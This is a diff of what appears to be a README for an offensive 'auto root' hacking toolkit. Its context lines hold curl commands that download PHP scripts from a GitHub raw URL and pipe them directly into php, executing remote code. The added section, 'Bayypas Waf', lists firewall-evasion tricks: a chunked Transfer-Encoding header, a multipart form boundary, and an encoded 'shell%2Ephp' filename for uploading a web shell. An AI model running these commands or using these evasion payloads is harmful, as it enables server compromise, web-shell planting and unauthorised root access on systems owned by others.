@@ -30,6 +30,12 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outs
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/simple.php | php
 ```
-
-
+# Bayypas Waf
+```
+Transfer-Encoding: chunked
+```
+Content-Type: multipart/form-data; boundary=---------------------------123456789;
+```
+shell%2Ephp
+```
 ☠️ Powerfull Auto root Localroot By Ghost haxor | Mr.W4W4N ☠️
